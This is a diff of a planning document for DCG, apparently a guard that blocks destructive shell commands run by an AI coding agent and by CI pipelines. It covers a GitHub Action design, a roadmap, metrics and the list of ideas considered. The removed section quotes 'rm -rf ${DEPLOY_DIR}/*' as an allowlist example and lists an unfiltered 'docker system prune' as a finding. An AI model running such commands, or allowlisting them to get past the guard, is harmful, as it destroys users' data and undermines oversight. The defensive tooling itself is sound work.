-2. **Add to allowlist** - If this is a false positive, add to `.dcg/allowlist.toml`:
-   ```toml
-   [[allow]]
-   exact_command = "rm -rf ${DEPLOY_DIR}/*"
-   reason = "Validated in deploy script"
-   ```
-3. **Request review** - If unsure, request review from a security-focused team member
-
-</details>
-
----
-*Scanned by [DCG](https://github.com/anthropics/dcg) v0.2.0 • [Documentation](https://docs.dcg.dev)*
-```
-
-### Action Inputs
-
-| Input | Description | Default |
-|-------|-------------|---------|
-| `fail_on` | Severity threshold: `error`, `warning`, `none` | `error` |
-| `scan_paths` | Glob patterns for files to scan | `**/*.sh` etc. |
-| `exclude_paths` | Glob patterns to exclude | `vendor/**` etc. |
-| `comment_on_pr` | Post findings as PR comment | `true` |
-| `show_suggestions` | Include fix suggestions | `true` |
-| `github_token` | Token for API access | `${{ github.token }}` |
-| `config_file` | Path to DCG config | `.dcg/config.toml` |
-| `allowlist_file` | Path to allowlist | `.dcg/allowlist.toml` |
-
-### Action Outputs
-
-| Output | Description |
-|--------|-------------|
-| `error_count` | Number of errors found |
-| `warning_count` | Number of warnings found |
-| `scanned_files` | Number of files scanned |
-| `findings_json` | JSON array of all findings |
-
-### Check Status Integration
-
-The action creates a GitHub Check with detailed status:
-
-```
-DCG Security Scan
-✗ 1 error, 1 warning
-
-Details:
-- scripts/deploy.sh: rm -rf with unvalidated variable
-- .github/workflows/cleanup.yml: docker system prune without filter
-```
-
-This integrates with branch protection rules—repositories can require the DCG check to pass before merging.
-
-### Diff-Only Scanning
-
-By default, the action only scans files changed in the PR:
-
-```yaml
-- name: Get changed files
-  id: changed
-  run: |
-    echo "files=$(git diff --name-only ${{ github.event.pull_request.base.sha }} ${{ github.sha }} | tr '\n' ' ')" >> $GITHUB_OUTPUT
-
-- name: DCG Scan
-  uses: anthropics/dcg-action@v1
-  with:
-    scan_paths: ${{ steps.changed.outputs.files }}
-```
-
-This keeps scans fast—only the changed code is analyzed.
-
-### Technical Implementation
-
-#### Action Structure
-
-```
-dcg-action/
-├── action.yml           # Action definition
-├── Dockerfile          # Container with DCG binary
-├── entrypoint.sh       # Main script
-├── src/
-│   ├── index.ts        # TypeScript entry point
-│   ├── scanner.ts      # Invokes DCG binary
-│   ├── reporter.ts     # Formats output
-│   └── github.ts       # GitHub API integration
-├── package.json
-└── README.md
-```
-
-#### action.yml
-
-```yaml
-name: 'DCG Security Scan'
-description: 'Scan for dangerous command patterns in shell scripts and configs'
-author: 'Anthropic'
-
-branding:
-  icon: 'shield'
-  color: 'blue'
-
-inputs:
-  fail_on:
-    description: 'Severity threshold for failing'
-    required: false
-    default: 'error'
-  scan_paths:
-    description: 'File patterns to scan (newline-separated)'
-    required: false
-    default: |
-      **/*.sh
-      **/*.bash
-      **/Makefile
-      **/*.yml
-      **/*.yaml
-      **/Dockerfile*
-  exclude_paths:
-    description: 'File patterns to exclude (newline-separated)'
-    required: false
-    default: |
-      vendor/**
-      node_modules/**
-  comment_on_pr:
-    description: 'Post comment on PR'
-    required: false
-    default: 'true'
-  github_token:
-    description: 'GitHub token for API access'
-    required: true
-    default: ${{ github.token }}
-
-outputs:
-  error_count:
-    description: 'Number of errors found'
-  warning_count:
-    description: 'Number of warnings found'
-  findings_json:
-    description: 'JSON array of findings'
-
-runs:
-  using: 'docker'
-  image: 'Dockerfile'
-  args:
-    - ${{ inputs.fail_on }}
-    - ${{ inputs.scan_paths }}
-    - ${{ inputs.exclude_paths }}
-    - ${{ inputs.comment_on_pr }}
-    - ${{ inputs.github_token }}
-```
-
-### Implementation Phases
-
-**Phase 1: Core Action (2-3 days)**
-- Docker container with DCG binary
-- Basic scanning of changed files
-- Exit code based on findings
-
-**Phase 2: GitHub Integration (2-3 days)**
-- PR comment posting
-- Check status creation
-- Findings formatting (markdown)
-
-**Phase 3: Advanced Features (1-2 days)**
-- Allowlist support
-- Suggestion generation
-- JSON output for further processing
-
-**Phase 4: Documentation & Release (1 day)**
-- README with examples
-- GitHub Marketplace listing
-- Version tagging
+## Comprehensive Ideas Analysis (30 Ideas)
+
+Below are all 30 ideas considered, with analysis of each.
+
+| # | Idea | Impact | Effort | Selected |
+|---|------|--------|--------|----------|
+| 1 | Pack-aware global quick reject | Critical | Low | ✓ #1 |
+| 2 | Deterministic pack ordering | Critical | Low | ✓ #1 |
+| 3 | Stable match identity (pack_id + pattern_name) | High | Low | ✓ #1 |
+| 4 | Shared evaluator (hook = CLI) | Critical | Medium | ✓ #1 |
+| 5 | Precompile override regex | Medium | Low | ✓ #1 |
+| 6 | Execution-context classification | Critical | High | ✓ #2 |
+| 7 | Safe string-argument registry | High | Low | ✓ #2 |
+| 8 | Token-aware keyword gating | Medium | Medium | Merged into #2 |
+| 9 | Normalize wrappers (sudo/env) | Medium | Low | ✓ Integrated |
+| 10 | Decision modes (deny/warn/log) | Medium | Medium | ✓ Integrated |
+| 11 | Structured logging + redaction | Medium | Medium | ✓ Integrated |
+| 12 | `dcg explain` trace output | High | Medium | ✓ #3 |
+| 13 | Allowlist by rule ID | High | Medium | ✓ #4 |
+| 14 | Simulation mode (dry run on logs) | Medium | Low | Appendix |
+| 15 | Observe mode (warn-only rollout) | Medium | Low | ✓ Integrated |
+| 16 | Prefer linear-time regex | Medium | Medium | ✓ #7 |
+| 17 | Size/time limits (DoS protection) | Critical | Low | ✓ #5, #7 |
+| 18 | E2E tests for non-core packs | High | Medium | ✓ #7 |
+| 19 | Golden parity tests (hook = CLI) | High | Low | ✓ #1 |
+| 20 | Pack keyword audit tests | Medium | Low | ✓ #7 |
+| 21 | Per-rule suggestions | Medium | Medium | ✓ #3 |
+| 22 | Improved `dcg doctor` | Medium | Low | ✓ Integrated |
+| 23 | Config discovery optimizations | Low | Low | Appendix |
+| 24 | Safe cleanup pack (rm -rf target/) | Medium | Medium | Appendix |
+| 25 | Rule severity taxonomy | Medium | Low | ✓ Integrated |
+| 26 | Confidence scoring | Medium | High | Appendix |
+| 27 | Tiered heredoc scanning | High | High | ✓ #5 |
+| 28 | Language detection heuristics | Medium | Medium | ✓ #5 |
+| 29 | Fuzz/property testing | High | Medium | ✓ #7 |
+| 30 | Performance benchmarks in CI | High | Medium | ✓ #7 |
 
 ---
 
 ## Implementation Roadmap
 
-### Phase 1: Foundation (Week 1-2)
+### Phase 1: Core Correctness (Week 1-2)
 
-| Task | Effort | Dependencies |
-|------|--------|--------------|
-| Explain mode core infrastructure | 3 days | None |
-| Allowlist module | 2 days | None |
-| Property-based test setup | 2 days | None |
+**Goal**: Fix the foundation before building features.
 
-### Phase 2: Core Features (Week 3-4)
+| Task | Effort | Priority |
+|------|--------|----------|
+| Pack-aware quick reject | 2 days | P0 |
+| Deterministic pack ordering | 1 day | P0 |
+| Stable match identity | 1 day | P0 |
+| Shared evaluator | 2 days | P0 |
+| Precompile overrides | 1 day | P1 |
+| Parity tests | 2 days | P0 |
 
-| Task | Effort | Dependencies |
-|------|--------|--------------|
-| Explain mode CLI & formatting | 2 days | Explain core |
-| Interactive learning mode | 3 days | Allowlist |
-| Fuzzing targets | 2 days | None |
-| Pre-commit scanner | 3 days | None |
+**Deliverable**: Enabled packs work, decisions are deterministic, test matches reality.
 
-### Phase 3: Integration (Week 5-6)
+### Phase 2: False Positive Immunity (Week 3-4)
 
-| Task | Effort | Dependencies |
-|------|--------|--------------|
-| Pre-commit hook installation | 2 days | Scanner |
-| Hook manager integration | 2 days | Hook installation |
-| GitHub Action core | 3 days | None |
-| GitHub Action PR integration | 2 days | Action core |
+**Goal**: Eliminate the most frustrating false positives.
 
-### Phase 4: Polish (Week 7-8)
+| Task | Effort | Priority |
+|------|--------|----------|
+| Safe string-arg registry | 2 days | P0 |
+| Minimal tokenizer | 4 days | P1 |
+| Integration + testing | 2 days | P1 |
 
-| Task | Effort | Dependencies |
-|------|--------|--------------|
-| Suggestions database | 2 days | Explain mode |
-| Corpus-based regression tests | 2 days | Fuzzing |
-| Documentation | 3 days | All features |
-| Release & marketing | 2 days | Documentation |
+**Deliverable**: Documentation commands work (`bd create`, `git commit -m`, `grep`).
 
-### Total Estimated Effort
+### Phase 3: Explainability (Week 5-6)
 
-| Phase | Duration | Key Deliverables |
-|-------|----------|------------------|
-| Foundation | 2 weeks | Explain mode, allowlist, proptest |
-| Core Features | 2 weeks | Learning mode, fuzzing, scanner |
-| Integration | 2 weeks | Pre-commit hooks, GitHub Action |
-| Polish | 2 weeks | Suggestions, docs, release |
-| **Total** | **8 weeks** | Full feature set |
+**Goal**: Users can understand and debug decisions.
+
+| Task | Effort | Priority |
+|------|--------|----------|
+| Explain trace infrastructure | 2 days | P1 |
+| Context analysis display | 2 days | P1 |
+| Allowlist by rule ID | 3 days | P1 |
+| Suggestions database | 2 days | P2 |
+
+**Deliverable**: `dcg explain` works, allowlisting is safe and simple.
+
+### Phase 4: Deep Scanning (Week 7-8)
+
+**Goal**: Catch sophisticated bypasses.
+
+| Task | Effort | Priority |
+|------|--------|----------|
+| Tier 1 triggers | 1 day | P1 |
+| Tier 2 extraction | 3 days | P1 |
+| Language detection | 2 days | P2 |
+| Tier 3 AST matching | 4 days | P2 |
+
+**Deliverable**: Heredocs and inline scripts are analyzed.
+
+### Phase 5: Team Protection (Week 9-10)
+
+**Goal**: Extend protection to entire workflow.
+
+| Task | Effort | Priority |
+|------|--------|----------|
+| Pre-commit scanner | 3 days | P2 |
+| Hook installation | 2 days | P2 |
+| GitHub Action | 4 days | P2 |
+
+**Deliverable**: Pre-commit and CI/CD protection.
+
+### Phase 6: Hardening (Ongoing)
+
+**Goal**: Ensure long-term reliability.
+
+| Task | Effort | Priority |
+|------|--------|----------|
+| Property-based tests | 2 days | P1 |
+| Fuzzing setup | 2 days | P1 |
+| Performance benchmarks | 2 days | P2 |
+| CI integration | 1 day | P2 |
+
+**Deliverable**: No panics, no hangs, performance budgets enforced.
 
 ---
 
 ## Success Metrics
 
+### Correctness Metrics
+
+| Metric | Target | Measurement |
+|--------|--------|-------------|
+| Pack reachability | 100% | All enabled packs evaluated in E2E tests |
+| Decision determinism | 100% | Same result on 1000 repeated runs |
+| Hook/CLI parity | 100% | Parity test suite passes |
+
 ### User Experience Metrics
 
 | Metric | Target | Measurement |
 |--------|--------|-------------|
-| False positive rate | <5% | Telemetry (opt-in) |
-| Time to understand block | <30 seconds | User testing |
-| Time to resolve false positive | <2 minutes | User testing |
-| User satisfaction (NPS) | >50 | Survey |
+| False positive rate | <2% | User reports, telemetry |
+| Time to understand block | <30s | User testing with explain mode |
+| Time to resolve false positive | <2min | User testing with allowlist |
 
 ### Reliability Metrics
 
 | Metric | Target | Measurement |
 |--------|--------|-------------|
-| Crash rate | 0% | Crash reporting |
-| Test coverage | >90% | Coverage tools |
-| Property test failures | 0 | CI |
-| Fuzz test crashes | 0 | CI |
+| Crash rate | 0% | Fuzzing, production monitoring |
+| Timeout rate | <0.1% | Telemetry |
+| P99 latency (fast path) | <500μs | Benchmarks |
+| P99 latency (heredoc path) | <20ms | Benchmarks |
 
 ### Adoption Metrics
 
 | Metric | Target | Measurement |
 |--------|--------|-------------|
-| Projects with allowlist | 30% of users | File detection |
-| Pre-commit hook installs | 20% of users | Install tracking |
-| GitHub Action usage | 1000+ repos | Marketplace stats |
-| Community contributions | 10+ pattern packs | GitHub |
-
----
-
-## Appendix: Ideas Not Selected
-
-The following ideas were considered but not included in the top 5:
-
-| Idea | Reason Not Selected |
-|------|---------------------|
-| Bloom filter pre-check | Marginal gain over memchr, premature optimization |
-| Hot-reloading config | DCG is invoked per-command, not long-running |
-| Shell completions | DCG is usually invoked by Claude Code, not typed |
-| VS Code extension | Redundant with Claude Code hook |
-| Cross-command context | Complex, requires statefulness, higher false positive risk |
-| ML-based detection | Adds latency and complexity, regex works well |
-| Prometheus metrics | DCG is CLI, not long-running service |
-| Community pattern packs | Valuable but requires significant infrastructure (registry, trust model) |
-| Semantic intent analysis | Too vague, hard to implement reliably |
-| Project type detection | Nice personalization but adds complexity |
-
-These ideas may be revisited in future versions as the project matures.
+| Users with allowlist | 30% | File detection |
+| Pre-commit hook installs | 20% | Tracking |
+| GitHub Action usage | 1000+ repos | Marketplace |
 
 ---
 
 ## Conclusion
 
-The five improvements outlined in this document form a cohesive strategy to make DCG:
+The seven improvements outlined in this document form a coherent, dependency-ordered strategy:
 
-1. **Transparent** — Explain mode shows exactly why decisions are made
-2. **Customizable** — Allowlists let users tailor behavior to their projects
-3. **Comprehensive** — Pre-commit hooks protect the codebase, not just execution
-4. **Reliable** — Property-based testing and fuzzing ensure robustness
-5. **Scalable** — GitHub Action extends protection to entire teams
+1. **Core Correctness** — Fix the foundation (pack reachability, determinism)
+2. **False Positive Immunity** — Eliminate the trust-destroying interruptions
+3. **Explain Mode** — Make decisions transparent and debuggable
+4. **Allowlisting by Rule ID** — Safe, auditable customization
+5. **Tiered Heredoc Scanning** — Catch sophisticated bypasses
+6. **Team Protection** — Extend to pre-commit and CI/CD
+7. **Reliability Guardrails** — Ensure long-term sustainability
 
-Together, these improvements transform DCG from a reactive blocker into a proactive security layer that users understand, trust, and rely on.
+Together, these transform DCG from "a hook that sometimes blocks things" into "a trusted security layer that is obviously correct, rarely annoying, and always enabled."
 
 ---
 
-*Document generated by Claude Opus 4.5 on 2026-01-07*
+*Document generated by Claude Opus 4.5 on 2026-01-08 (Enhanced Hybrid Version)*
